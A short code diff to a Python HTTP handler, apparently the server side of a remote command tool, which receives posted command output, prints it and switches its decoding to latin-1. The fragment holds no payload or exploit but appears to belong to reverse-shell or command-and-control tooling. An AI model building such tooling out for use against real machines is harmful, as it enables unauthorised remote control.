@@ -141,7 +141,7 @@ def shell_comands(self):
     self.send_response(200)
     self.end_headers()
     length = int(self.headers['Content-Length'])
-    command_output = self.rfile.read(length).decode()
+    command_output = self.rfile.read(length).decode('latin-1')
     print(command_output)
 
 
